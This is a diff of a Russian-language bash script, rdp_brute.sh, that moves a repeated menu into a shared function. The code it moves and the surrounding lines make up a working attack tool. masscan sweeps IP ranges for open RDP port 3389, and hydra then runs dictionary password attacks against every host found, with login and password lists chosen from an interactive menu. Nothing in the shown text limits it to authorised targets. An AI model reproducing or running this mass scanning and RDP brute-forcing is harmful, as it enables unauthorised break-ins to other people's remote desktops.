-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -11050,6 +4463,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -11059,53 +4473,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -11123,6 +4491,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -11132,53 +4501,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -11196,6 +4519,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -11205,53 +4529,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -11269,6 +4547,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -11278,53 +4557,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -11342,6 +4575,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -11351,53 +4585,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -11415,6 +4603,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -11424,53 +4613,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -11488,6 +4631,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -11497,53 +4641,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -11561,6 +4659,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -11570,53 +4669,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -11634,6 +4687,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -11643,53 +4697,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -11707,6 +4715,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -11716,53 +4725,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -11780,6 +4743,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -11789,53 +4753,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -11853,6 +4771,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -11862,53 +4781,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -11926,6 +4799,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -11935,53 +4809,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -11999,6 +4827,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -12008,53 +4837,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
